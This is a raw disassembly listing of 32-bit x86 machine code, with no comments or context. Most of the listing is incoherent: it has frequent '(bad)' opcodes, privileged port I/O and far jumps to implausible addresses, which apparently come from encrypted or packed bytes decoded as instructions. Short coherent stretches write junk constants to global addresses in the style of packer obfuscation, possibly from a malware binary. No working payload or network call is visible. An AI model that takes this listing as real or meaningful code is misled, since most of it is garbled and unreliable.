  4038fc:	mov    edx,0x9c959ee6
  403901:	cdq    
  403902:	(bad)  
  403903:	cmp    bl,BYTE PTR [eax]
  403905:	sub    ebp,ecx
  403907:	or     esp,DWORD PTR [ebx+0x3145f203]
  40390d:	mov    ds:0x7f015f15,al
  403912:	in     al,dx
  403913:	pop    ecx
  403914:	repnz cs pop edx
  403917:	and    BYTE PTR [bx+si-0x10],bl
  40391b:	test   BYTE PTR [edi],0x4d
  40391e:	adc    ebx,DWORD PTR [ebx+0x620674b0]
  403924:	loope  0x403992
  403926:	lds    ebp,FWORD PTR [edx+edx*1]
  403929:	test   BYTE PTR [eax+0x11],bl
  40392c:	inc    esp
  40392d:	sub    esi,DWORD PTR [ebx]
  40392f:	mov    ecx,0x907c6e55
  403934:	and    ah,0x7f
  403937:	jmp    0xea6cd76c
  40393c:	or     bh,0x84
  40393f:	enter  0xf05,0xf2
  403943:	loope  0x4039b5
  403945:	push   edx
  403946:	popa   
  403947:	sbb    dh,dl
  403949:	add    esp,DWORD PTR [ebx+0x10]
  40394c:	(bad)  
  40394d:	into   
  40394e:	fwait
  40394f:	call   0xb6659820
  403954:	mov    WORD PTR [ebx],ds
  403956:	clc    
  403957:	lods   eax,DWORD PTR ds:[esi]
  403958:	out    dx,al
  403959:	mov    ds:0xd6f8d59c,eax
  40395e:	ret    0xaef
  403961:	push   esp
  403962:	repnz int3 
  403964:	repz mov bl,0x2d
  403967:	imul   ebx,eax,0x20667984
  40396d:	push   ecx
  40396e:	lds    ecx,FWORD PTR [edi-0x5f6d3d5b]
  403974:	sbb    al,0xab
  403976:	ds jge 0x403931
  403979:	clc    
  40397a:	push   ss
  40397b:	adc    eax,DWORD PTR [ecx]
  40397d:	inc    eax
  40397e:	out    dx,al
  40397f:	aad    0xb3
  403981:	push   ecx
  403982:	(bad)  
  403984:	push   ebx
  403985:	sbb    bl,BYTE PTR [ebx]
  403987:	fsubr  QWORD PTR [eax]
  403989:	int3   
  40398a:	rcl    DWORD PTR [ebx],0x4a
  40398d:	xchg   ebp,eax
  40398e:	ss mov ebp,0x72bd3902
  403994:	mov    esp,0xdab4758f
  403999:	fadd   DWORD PTR [esi-0x1f]
  40399c:	jb     0x403974
  40399e:	ret    0xf22f
  4039a1:	test   al,0x73
  4039a3:	xor    cl,0x9d
  4039a6:	cmp    ebp,DWORD PTR [edx]
  4039a8:	mov    bh,0xa6
  4039aa:	test   DWORD PTR [edx-0x65bf8356],edx
  4039b0:	and    al,0xa7
  4039b2:	pop    eax
  4039b3:	cmp    eax,0x34a79f00
  4039b8:	and    BYTE PTR [edi],ch
  4039ba:	ins    BYTE PTR es:[edi],dx
  4039bb:	in     eax,dx
  4039bc:	popa   
  4039bd:	lock and eax,DWORD PTR [edx-0x5]
  4039c1:	popf   
  4039c2:	test   al,0x46
  4039c4:	xchg   edi,eax
  4039c5:	or     esp,ecx
  4039c7:	dec    ebx
  4039c8:	int3   
  4039c9:	pop    ecx
  4039ca:	add    al,0xad
  4039cc:	fsubp  st(7),st
  4039ce:	stc    
  4039cf:	frstor [eax+edx*2-0x2252424f]
  4039d6:	inc    ebx
  4039d7:	xor    al,0x2a
  4039d9:	sub    DWORD PTR ds:0xd9f879f9,eax
  4039df:	cwde   
  4039e0:	adc    al,0xc1
  4039e2:	jno    0x403a15
  4039e4:	ds out dx,eax
  4039e6:	lea    esp,[edi+0x50]
  4039e9:	mov    edi,0xa7c94cdc
  4039ee:	mov    ds:0xb508cf14,eax
  4039f3:	stc    
  4039f4:	add    BYTE PTR [eax-0x26292216],ah
  4039fa:	(bad)  
  4039fb:	and    bl,BYTE PTR [ebp-0x38]
  4039fe:	pop    ds
  4039ff:	fistp  DWORD PTR [edx]
  403a01:	ffreep st(6)
  403a03:	dec    ebp
  403a04:	cmp    ch,BYTE PTR [edi]
  403a06:	dec    ebx
  403a07:	js     0x403a85
  403a09:	jge    0x4039ac
  403a0b:	mov    dh,0x4b
  403a0d:	inc    esi
  403a0e:	mov    ds:0x1b8d5886,al
  403a13:	mov    bh,0x72
  403a15:	js     0x4039ab
  403a17:	xor    edx,edi
  403a19:	jmp    0xb2378f92
  403a1e:	(bad)  
  403a1f:	mov    esi,0x3f2475cf
  403a24:	inc    esi
  403a25:	pop    edi
  403a26:	push   0xffffffbc
  403a28:	jns    0x4039fe
  403a2a:	mov    ah,0xaa
  403a2c:	cmp    DWORD PTR [ebp+0x374f3231],eax
  403a32:	sbb    BYTE PTR [ebp-0x5a],0x28
  403a36:	cwde   
  403a37:	imul   ecx,ebp,0xfffffffd
  403a3a:	push   esi
  403a3b:	adc    ebp,DWORD PTR [edx-0x5]
  403a3e:	push   es
  403a3f:	dec    edx
  403a40:	out    0x44,eax
  403a42:	inc    ebx
  403a43:	mov    ds:0x34aba77d,eax
  403a48:	in     al,0x9
  403a4a:	into   
  403a4b:	test   DWORD PTR [esi],eax
  403a4d:	mov    cs,eax
  403a4f:	shl    BYTE PTR [edi+edx*8],cl
  403a52:	div    dh
  403a54:	fnstsw WORD PTR [eax+0x38fb9b9e]
  403a5a:	cmp    ebx,DWORD PTR [ebp+0x4c]
  403a5d:	in     eax,0x1a
  403a5f:	aam    0x57
  403a61:	fist   WORD PTR [edx-0x12eeb834]
  403a67:	repnz push cs
  403a69:	mov    BYTE PTR [edx-0xf7f9957],0x6e
  403a70:	into   
  403a71:	and    BYTE PTR [ebx-0x7e],al
  403a74:	loopne 0x403ac8
  403a76:	es push ebp
  403a78:	inc    esi
  403a79:	or     ebx,DWORD PTR [ebp-0x343de948]
  403a7f:	cmp    ecx,DWORD PTR [ebx+eiz*1+0x7537d5f]
  403a86:	test   BYTE PTR [edi-0x25],ah
  403a89:	cmp    DWORD PTR [esi-0x52],ebx
  403a8c:	sbb    cl,cl
  403a8e:	imul   esi,DWORD PTR [ecx+ebx*1-0xc],0x28e814c3
  403a96:	sub    ecx,DWORD PTR ds:0x1c371f0f
  403a9c:	cmc    
  403a9d:	inc    edx
  403a9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9f:	in     al,0x8a
  403aa1:	or     bh,bh
  403aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa4:	leave  
  403aa5:	mov    dh,BYTE PTR [edx-0x33]
  403aa8:	sbb    DWORD PTR [esp+edi*8-0x41],esp
  403aac:	aas    
  403aad:	pop    ebx
  403aae:	call   0x4392:0x8a63c10c
  403ab5:	pop    ds
  403ab6:	push   ds
  403ab7:	mov    cl,0x76
  403ab9:	push   edi
  403aba:	adc    al,0x31
  403abc:	mov    WORD PTR [ecx-0x28],es
  403abf:	std    
  403ac0:	(bad)  
  403ac1:	jmp    0xb88:0xd6893e25
  403ac8:	retf   0x2147
  403acb:	lock jne 0x403b43
  403ace:	sub    edx,DWORD PTR [edx+0x2d4437dc]
  403ad4:	mov    edi,0xc9c6ed9
  403ad9:	pop    es
  403ada:	add    BYTE PTR [ebp-0x2],0xe2
  403ade:	cwde   
  403adf:	dec    ebp
  403ae0:	mov    WORD PTR [ecx+0x1d6ca702],ss
  403ae6:	and    BYTE PTR [edi+0x28],0xa6
  403aea:	jae    0x403a7d
  403aec:	(bad)  
  403aed:	fisub  DWORD PTR [edx+0x46]
  403af0:	mov    al,BYTE PTR [ebp-0x1]
  403af3:	movzx  ecx,WORD PTR ds:0x42e6eb
  403afa:	adc    DWORD PTR ds:0x42fd76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x40545a69],esi
  403b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b3f:	lds    ebx,FWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xe670707d
  403b48:	jmp    0xd1ac:0xca76784b
  403b4f:	dec    esp
  403b50:	pusha  
  403b51:	inc    esi
  403b52:	jmp    DWORD PTR [edi+ebx*2]
  403b55:	xchg   edi,eax
  403b56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b57:	cmp    DWORD PTR [esi+0x7],esp
  403b5a:	lahf   
  403b5b:	sahf   
  403b5c:	iret   
  403b5d:	imul   ebp,DWORD PTR [edx-0x68],0xffffff9e
  403b61:	xchg   edx,eax
  403b62:	cmp    BYTE PTR [ecx],bl
  403b64:	call   0x3f5d:0x74cbb0ea
  403b6b:	or     dh,ch
  403b6d:	pop    esi
  403b6e:	xchg   esi,eax
  403b6f:	pop    esp
  403b70:	ret    
  403b71:	and    eax,DWORD PTR cs:[edi]
  403b74:	push   edi
  403b75:	or     DWORD PTR [edx-0x1356d8a5],eax
  403b7b:	xchg   ecx,eax
  403b7c:	cmp    edx,esi
  403b7e:	test   ebp,esp
  403b80:	icebp  
  403b81:	xchg   ebp,eax
  403b82:	mov    ss,WORD PTR [ecx+0x57]
  403b85:	stos   DWORD PTR es:[edi],eax
  403b86:	inc    edi
  403b87:	data16 fisub DWORD PTR [edi+0x2c]
  403b8b:	jmp    0xf3c0:0x495dbf5f
  403b92:	jae    0x403bd4
  403b94:	lea    ebx,[esp-0x12]
  403b98:	sub    eax,0xc7f19242
  403b9d:	push   eax
  403b9e:	xchg   ecx,eax
  403b9f:	in     al,dx
  403ba0:	imul   eax,DWORD PTR [ebx-0x1d],0xd5e8c8fe
  403ba7:	jbe    0x403be6
  403ba9:	je     0x403bca
  403bab:	add    al,0x2f
  403bad:	sub    al,0xea
  403baf:	cmp    DWORD PTR [edi],edx
  403bb1:	mov    edi,0x3bdffc27
  403bb6:	nop
  403bb7:	xor    BYTE PTR [esi],cl
  403bb9:	mov    ebx,0x264a7657
  403bbe:	pop    edx
  403bbf:	popf   
  403bc0:	pop    es
  403bc1:	test   DWORD PTR [ecx-0xd],ebx
  403bc4:	icebp  
  403bc5:	xchg   esi,eax
  403bc6:	pop    ecx
  403bc7:	enter  0x213d,0xdc
  403bcb:	jbe    0x403b9d
  403bcd:	aam    0xdd
  403bcf:	lahf   
  403bd0:	outs   dx,DWORD PTR ds:[esi]
  403bd1:	or     DWORD PTR [esi],ebp
  403bd3:	test   al,0xac
  403bd5:	pop    edx
  403bd6:	shr    DWORD PTR [esp+ebx*4],1
  403bd9:	sbb    eax,0xb7623878
  403bde:	stos   DWORD PTR es:[edi],eax
  403bdf:	jb     0x403bcf
  403be1:	int3   
  403be2:	mov    bl,0xe9
  403be4:	dec    edx
  403be5:	pop    eax
  403be6:	retf   0xc7cd
  403be9:	data16 in al,dx
  403beb:	jns    0x403b6e
  403bed:	and    eax,eax
  403bef:	sbb    bh,BYTE PTR [esp+eiz*4]
  403bf2:	push   edi
  403bf3:	xor    al,BYTE PTR [ebx-0x3b]
  403bf6:	jnp    0x403b84
  403bf8:	rcr    DWORD PTR [ecx],1
  403bfa:	and    ebx,edi
  403bfc:	and    cl,BYTE PTR [ecx-0x4fa17803]
  403c02:	pop    ebx
  403c03:	gs enter 0x9f69,0xb1
  403c08:	rcr    esi,cl
  403c0a:	push   esi
  403c0b:	pushf  
  403c0c:	dec    ebx
  403c0d:	retf   
  403c0e:	inc    ebp
  403c0f:	daa    
  403c10:	inc    eax
  403c11:	les    eax,FWORD PTR [esi-0x621df66d]
  403c17:	cmp    edi,DWORD PTR [ebx-0x80]
  403c1a:	popa   
  403c1b:	iret   
  403c1c:	cld    
  403c1d:	add    ebp,esi
  403c1f:	inc    esp
  403c20:	or     al,0xff
  403c22:	mov    esi,DWORD PTR [ecx-0x34923946]
  403c28:	cld    
  403c29:	pop    ds
  403c2a:	aad    0x6e
  403c2c:	out    0xc9,eax
  403c2e:	and    eax,0xcf3fa6a2
  403c33:	cmp    ch,BYTE PTR [ebx-0x5c]
  403c36:	adc    al,0x60
  403c38:	sub    eax,0xfafef321
  403c3d:	sub    eax,0x981bb707
  403c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c43:	daa    
  403c44:	mov    bl,0xb3
  403c46:	loop   0x403ca6
  403c48:	or     bl,BYTE PTR [edx]
  403c4a:	push   0x41
  403c4c:	mov    al,0x88
  403c4e:	rol    BYTE PTR [ebx+0x4f3ef53c],0xfe
  403c55:	sbb    DWORD PTR [esi-0x36],esi
  403c58:	(bad)  
  403c59:	(bad)  
  403c5a:	test   BYTE PTR [ecx],dl
  403c5c:	mov    ch,BYTE PTR [eax-0x2f268859]
  403c62:	into   
  403c63:	test   BYTE PTR [esi],dl
  403c65:	stc    
  403c66:	fld    DWORD PTR [eax+0x6226453c]
  403c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c6d:	imul   edx,DWORD PTR [eax+0x76f5c8c2],0x1a2c42ff
  403c77:	outs   dx,DWORD PTR ds:[esi]
  403c78:	cmc    
  403c79:	int    0x95
  403c7b:	scas   al,BYTE PTR es:[edi]
  403c7c:	xor    ch,0x6e
  403c7f:	cli    
  403c80:	dec    ebx
  403c81:	push   0x14
  403c83:	or     ecx,esi
  403c85:	inc    esp
  403c86:	inc    esi
  403c87:	fs cld 
  403c89:	shl    BYTE PTR [ebp-0x65],1
  403c8c:	ret    
  403c8d:	pop    eax
  403c8e:	jns    0x403c8c
  403c90:	test   DWORD PTR [ecx-0x5a],0x49d1a669
  403c97:	loope  0x403ca6
  403c99:	cmp    al,0xda
  403c9b:	rol    DWORD PTR ds:0x97381b02,1
  403ca1:	in     eax,dx
  403ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ca3:	std    
  403ca4:	xor    dh,BYTE PTR [eax+0x79]
  403ca7:	mov    ds:0x6440ea6f,eax
  403cac:	je     0x403cfd
  403cae:	xor    edx,ebp
  403cb0:	lds    esp,FWORD PTR [eax+0x6580d51]
  403cb6:	ror    DWORD PTR ds:0x30deb2b6,1
  403cbc:	aas    
  403cbd:	jge    0x403c70
  403cbf:	sbb    bl,BYTE PTR [eax]
  403cc1:	in     eax,0xe
  403cc3:	mov    esi,0x40274b12
  403cc8:	rcr    DWORD PTR [edi-0x35],1
  403ccb:	xchg   ecx,eax
  403ccc:	ins    BYTE PTR es:[edi],dx
  403ccd:	ret    0xb576
  403cd0:	mov    DWORD PTR [esi-0x6],eax
  403cd3:	fsub   QWORD PTR [eax+0x7b55bedb]
  403cd9:	(bad)  
  403cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cdb:	xor    eax,edx
  403cdd:	xor    DWORD PTR es:[bp+di+0x74ac],esp
  403ce3:	inc    ebp
  403ce4:	sahf   
  403ce5:	jmp    0x9ffb:0xf28e9615
  403cec:	adc    al,0x5f
  403cee:	rol    BYTE PTR [eax+eax*8+0x32],0x3f
  403cf3:	test   BYTE PTR [esi-0x22c9456],ah
  403cf9:	test   bl,0xf9
  403cfc:	jbe    0x403c7f
  403cfe:	leave  
  403cff:	in     eax,dx
  403d00:	ss sahf 
  403d02:	in     eax,0xf
  403d04:	or     al,0xbf
  403d06:	or     BYTE PTR [edx+0x692d599a],bh
  403d0c:	dec    edi
  403d0d:	neg    DWORD PTR ds:0xaaee57fd
  403d13:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  403d15:	cdq    
  403d16:	clc    
  403d17:	and    BYTE PTR [edx-0x2d],dh
  403d1a:	pop    edx
  403d1b:	pop    edi
  403d1c:	stc    
  403d1d:	in     al,0x39
  403d1f:	call   DWORD PTR [eax]
  403d21:	inc    esi
  403d22:	xor    ebp,DWORD PTR [edi]
  403d24:	jbe    0x403d6a
  403d26:	cmp    al,0xd6
  403d28:	add    DWORD PTR [edi-0x106804e7],edi
  403d2e:	in     eax,0xc9
  403d30:	push   esi
  403d31:	pop    ds
  403d32:	test   ch,0xf2
  403d35:	dec    ecx
  403d36:	loopne 0x403d3a
  403d38:	mov    ds:0x40a5b814,al
  403d3d:	aas    
  403d3e:	jmp    0x435e:0x7c0e2790
  403d45:	repz cmp BYTE PTR [eax-0x78],al
  403d49:	sub    dl,BYTE PTR [eax+0x69]
  403d4c:	and    edx,DWORD PTR [ecx-0x19]
  403d4f:	nop
  403d50:	push   0xffffff9b
  403d52:	mov    DWORD PTR [eax+0x300d5fda],edi
  403d58:	pop    ebp
  403d59:	daa    
  403d5a:	nop
  403d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5c:	inc    edx
  403d5d:	ss clc 
  403d5f:	inc    esp
  403d60:	scas   eax,DWORD PTR es:[edi]
  403d61:	repz xor al,0x49
  403d64:	fild   QWORD PTR [edi+0x4ea8f127]
  403d6a:	fdiv   QWORD PTR [eax+0x471b529e]
  403d70:	sub    al,BYTE PTR [esi+0x6d]
  403d73:	dec    edi
  403d74:	pop    ebp
  403d75:	mov    bh,0xa0
  403d77:	cdq    
  403d78:	pop    ds
  403d79:	mov    edi,0x7ca2cfaa
  403d7e:	sub    esp,DWORD PTR [edi]
  403d80:	shr    BYTE PTR [edi+0x70],cl
  403d83:	das    
  403d84:	sub    ecx,DWORD PTR [ecx]
  403d86:	lahf   
  403d87:	and    DWORD PTR [edi-0x1c],edi
  403d8a:	sub    DWORD PTR [ebx+edx*2],edx
  403d8d:	in     al,dx
  403d8e:	js     0x403d8c
  403d90:	sar    dl,1
  403d92:	and    al,0xc0
  403d94:	sub    DWORD PTR ds:0xfe560433,0xbdfd1a5
  403d9e:	rcr    ebp,1
  403da0:	ins    BYTE PTR es:[edi],dx
  403da1:	sahf   
  403da2:	push   ss
  403da3:	mov    esp,0x94c42cfa
  403da8:	jecxz  0x403db6
  403daa:	inc    eax
  403dab:	mov    ds:0xb4ff6486,al
  403db0:	call   DWORD PTR fs:[ebx-0x7]
  403db4:	ret    
  403db5:	sub    bh,BYTE PTR [eax+0x73]
  403db8:	dec    ebx
  403db9:	jg     0x403d4e
  403dbb:	push   ecx
  403dbc:	imul   edx,edx,0xffffff91
  403dbf:	int    0xc
  403dc1:	mov    ebx,0xd264be3c
  403dc6:	aam    0xe6
  403dc8:	mov    ebp,0x159e207b
  403dcd:	(bad)  
  403dce:	pop    ebp
  403dcf:	rcl    DWORD PTR [edi+esi*4+0x12d242a6],0x77
  403dd7:	aas    
  403dd8:	pusha  
  403dd9:	and    eax,0x6727b320
  403dde:	jb     0x403d83
  403de0:	sbb    bh,ah
  403de2:	pop    eax
  403de3:	nop
  403de4:	mov    eax,ds:0x78664f5
  403de9:	cmp    DWORD PTR es:[edi-0x64],eax
  403ded:	je     0x403d75
  403def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403df0:	ds push edx
  403df2:	sbb    eax,0xffffff97
  403df5:	xor    BYTE PTR [ecx+0x72b152fb],bh
  403dfb:	into   
  403dfc:	dec    ebp
  403dfd:	mov    cl,0xd3
  403dff:	mov    al,ds:0xba9048b8
  403e04:	loopne 0x403d98
  403e06:	pop    ecx
  403e07:	cmp    al,0xe
  403e09:	or     esp,edx
  403e0b:	mov    al,ds:0x11d9bdb0
  403e10:	fwait
  403e11:	repnz (bad) 
  403e14:	iret   
  403e15:	jmp    0x403e74
  403e17:	mov    ?,WORD PTR [ebp-0x5f]
  403e1a:	mov    esp,eax
  403e1c:	mov    ds:0xa45d01b,eax
  403e21:	pop    eax
  403e22:	imul   ebp,DWORD PTR [ebx],0x8121ee21
  403e28:	mov    BYTE PTR [esi-0x62],dl
  403e2b:	or     eax,0xf311541
  403e30:	inc    esi
  403e31:	retf   
  403e32:	cmovns esp,DWORD PTR [esi]
  403e35:	jle    0x403e96
  403e37:	in     al,0x3b
  403e39:	sbb    esp,DWORD PTR [ebx-0x2d11d05c]
  403e3f:	inc    edx
  403e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e41:	sahf   
  403e42:	cli    
  403e43:	(bad)  
  403e44:	rcr    bl,1
  403e46:	xchg   BYTE PTR [edi],bl
  403e48:	imul   ebx,DWORD PTR [edi-0x1a],0x93f5b187
  403e4f:	dec    ebp
  403e50:	adc    al,0x79
  403e52:	xchg   ecx,eax
  403e53:	fild   WORD PTR [edi]
  403e55:	add    BYTE PTR [edx-0x30c9ee4d],cl
  403e5b:	sbb    eax,0x2db3a569
  403e60:	aad    0x84
  403e62:	fisubr DWORD PTR [eax+0x488a9d43]
  403e68:	pop    edi
  403e69:	lods   al,BYTE PTR ds:[esi]
  403e6a:	cmp    esp,esp
  403e6c:	xchg   DWORD PTR [ebx],esi
  403e6e:	pop    eax
  403e6f:	call   0xa0ed:0x71a58825
  403e76:	sbb    BYTE PTR [edx+0x29],ch
  403e79:	mov    eax,0x99a2e68e
  403e7e:	rol    BYTE PTR [ecx+0x7b],1
  403e81:	jge    0x403e8a
  403e83:	jns    0x403e48
  403e85:	sub    dl,BYTE PTR [edi+0x3b]
  403e88:	hlt    
  403e89:	sbb    al,0xc7
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x36301c35
  403eec:	push   esi
  403eed:	jb     0x403e71
  403eef:	sbb    esi,DWORD PTR [eax+0x70]
  403ef2:	cmp    eax,0xb570707d
  403ef7:	xor    BYTE PTR [edi],ah
  403ef9:	jae    0x403ebc
  403efb:	(bad)  
  403efe:	xchg   edx,eax
  403eff:	cwde   
  403f00:	inc    ecx
  403f01:	xchg   ebp,eax
  403f02:	add    BYTE PTR [ecx+ecx*8+0x7a492fe8],ah
  403f09:	add    edx,DWORD PTR [edi]
  403f0b:	lods   al,BYTE PTR ds:[esi]
  403f0c:	cmp    al,0x9f
  403f0e:	fdivrp st(7),st
  403f10:	fwait
  403f11:	movlps xmm2,QWORD PTR [ecx+esi*8]
  403f15:	xchg   ebx,eax
  403f16:	push   0xe7f09bca
  403f1b:	xchg   edi,eax
  403f1c:	pop    esp
  403f1d:	imul   esi,esp,0xc0e0397d
  403f23:	jae    0x403f63
  403f25:	ficom  DWORD PTR [edi+0x1a]
  403f28:	hlt    
  403f29:	cli    
  403f2a:	add    al,0x11
  403f2c:	mov    ebx,0xc00b93eb
  403f31:	mov    eax,esi
  403f33:	icebp  
  403f34:	js     0x403f51
  403f36:	call   0x2254ccc5
  403f3b:	and    eax,0x89114525
  403f40:	cmp    al,0x3c
  403f42:	mov    BYTE PTR [edi-0x4489ad95],bl
  403f48:	mov    ebp,0x81e1e331
  403f4d:	addr16 fwait
  403f4f:	rol    bl,cl
  403f51:	push   0x941af615
  403f56:	mov    ds:0x3d8140ef,al
  403f5b:	jne    0x403fc5
  403f5d:	fwait
  403f5e:	pop    edx
  403f5f:	test   al,0xb4
  403f61:	jl     0x403f09
  403f63:	loop   0x403f77
  403f65:	daa    
  403f66:	cvttps2pi mm0,QWORD PTR [esi-0x30]
  403f6a:	aas    
  403f6b:	aad    0x7
  403f6d:	jge    0x403fdd
  403f6f:	shl    DWORD PTR [edi+0x1b3b5bfc],1
  403f75:	mov    ah,0x1c
  403f77:	jg     0x403feb
  403f79:	jnp    0x403f48
  403f7b:	xchg   BYTE PTR [eax-0x6e],dl
  403f7e:	push   ecx
  403f7f:	mov    DWORD PTR [ebp+0x2e],edi
  403f82:	mov    ebx,0x99f3e29c
  403f87:	jnp    0x403f5e
  403f89:	pandn  mm0,QWORD PTR [edi-0x3e]
  403f8d:	stos   DWORD PTR es:[edi],eax
  403f8e:	mov    al,ds:0xeffe12d2
  403f93:	mov    ch,BYTE PTR [esi-0x43]
  403f96:	xchg   edx,eax
  403f97:	data16 cli 
  403f99:	lods   al,BYTE PTR ds:[esi]
  403f9a:	dec    ebp
  403f9b:	and    DWORD PTR [edi],ebx
  403f9d:	adc    bl,BYTE PTR [edx]
  403f9f:	mov    esp,0xa9b9f2b4
  403fa4:	sub    ecx,ebp
  403fa6:	xchg   esp,eax
  403fa7:	and    cl,BYTE PTR [edx+0x60]
  403faa:	cs sbb edx,ecx
  403fad:	cmp    DWORD PTR [eax+0x29],ebx
  403fb0:	enter  0xa85d,0x5e
  403fb4:	mov    ah,BYTE PTR [edi]
  403fb6:	inc    ebp
  403fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb8:	adc    ebp,ebx
  403fba:	ss cli 
  403fbc:	ret    
  403fbd:	mov    eax,0x4b30c3b9
  403fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fc3:	repz test eax,0x2c8c84cf
  403fc9:	mov    esi,0x481f201b
  403fce:	int    0x8c
  403fd0:	outs   dx,BYTE PTR ds:[esi]
  403fd1:	pop    esp
  403fd2:	enter  0x5312,0x75
  403fd6:	add    DWORD PTR [ebp+0x6e],ebp
  403fd9:	add    al,0x68
  403fdb:	jg     0x403f6a
  403fdd:	pop    eax
  403fde:	das    
  403fdf:	add    al,0x97
  403fe1:	push   ecx
  403fe2:	repz mov ebp,DWORD PTR [ebp+eax*1+0x176a89e8]
  403fea:	add    al,0x14
  403fec:	sub    al,BYTE PTR [edx]
  403fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fef:	es retf 
  403ff1:	inc    esp
  403ff2:	mov    cs,esp
  403ff4:	lds    esi,FWORD PTR [ebx]
  403ff6:	xor    BYTE PTR [ebx+0x35],dl
  403ff9:	mov    edi,0x8412e544
  403ffe:	enter  0xac25,0x97
  404002:	mov    dl,BYTE PTR [ebx]
  404004:	loop   0x403fae
  404006:	inc    ebp
  404007:	or     dl,BYTE PTR [edx]
  404009:	loop   0x404075
  40400b:	pushf  
  40400c:	es dec eax
  40400e:	sti    
  40400f:	sbb    BYTE PTR [ebp+0x4dc5ede7],al
  404015:	and    cl,BYTE PTR [edx-0x1df2f9c7]
  40401b:	arpl   WORD PTR [ecx+0x40],si
  40401e:	mov    ds:0x29903700,al
  404023:	das    
  404024:	lods   al,BYTE PTR ds:[esi]
  404025:	xor    BYTE PTR [edi+0x62e8861],0xaf
  40402c:	cmc    
  40402d:	push   es
  40402e:	les    ecx,FWORD PTR ds:0x7fcea40f
  404034:	mov    eax,0x1394948d
  404039:	jne    0x4040ae
  40403b:	adc    eax,0x7fe54625
  404040:	in     al,0x7c
  404042:	sbb    dh,ch
  404044:	xor    dh,BYTE PTR [edx+0x5d]
  404047:	sar    si,cl
  40404a:	lahf   
  40404b:	imul   DWORD PTR [esi-0x5c]
  40404e:	fistp  WORD PTR [ecx+0x11]
  404051:	loop   0x4040a0
  404053:	or     eax,0x8fb7fa54
  404058:	outs   dx,BYTE PTR ds:[esi]
  404059:	jecxz  0x4040bb
  40405b:	jmp    0x404020
  40405d:	pop    ds
  40405e:	ins    DWORD PTR es:[edi],dx
  40405f:	xchg   edi,eax
  404060:	or     dl,BYTE PTR [ecx+0x42]
  404063:	xchg   ebp,eax
  404064:	add    cl,dh
  404066:	inc    esp
  404067:	fwait
  404068:	add    ecx,DWORD PTR [ebx+0x58e4cc86]
  40406e:	add    al,0xce
  404070:	or     DWORD PTR [edi+0x77],ebp
  404073:	sbb    DWORD PTR [edx],ecx
  404075:	or     DWORD PTR [edi-0x54],edx
  404078:	inc    eax
  404079:	aaa    
  40407a:	jae    0x404000
  40407c:	div    BYTE PTR ds:0x2f7dbff5
  404082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404083:	fisttp DWORD PTR ds:0x3d1aabe6
  404089:	pop    eax
  40408b:	das    
  40408c:	repz sti 
  40408e:	outs   dx,BYTE PTR ds:[esi]
  40408f:	sar    DWORD PTR [edx],1
  404091:	add    eax,0xbee9a5fd
  404096:	sar    DWORD PTR [edi-0x415e6398],cl
  40409c:	loopne 0x4040df
  40409e:	jecxz  0x4040ad
  4040a0:	add    al,BYTE PTR [eax]
  4040a2:	stos   DWORD PTR es:[edi],eax
  4040a3:	mov    ds:0xd5e49f77,eax
  4040a8:	imul   edi,esp,0x68a971c7
  4040ae:	lods   eax,DWORD PTR ds:[esi]
  4040af:	xchg   ecx,eax
  4040b0:	mov    esi,0x51897317
  4040b5:	retf   0x4a3d
  4040b8:	sbb    eax,0x7d5b5727
  4040bd:	add    eax,0x989d86d5
  4040c2:	jg     0x404092
  4040c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040c5:	pop    esp
  4040c6:	in     al,dx
  4040c7:	mov    ?,ecx
  4040c9:	mov    al,0xc9
  4040cb:	test   DWORD PTR [ecx+0xe102b71],ebx
  4040d1:	mov    al,ds:0x935377cd
  4040d6:	or     BYTE PTR [ebx+0x14d46baf],ah
  4040dc:	xchg   esi,eax
  4040dd:	push   edx
  4040de:	nop
  4040df:	dec    edi
  4040e0:	arpl   WORD PTR [eax],si
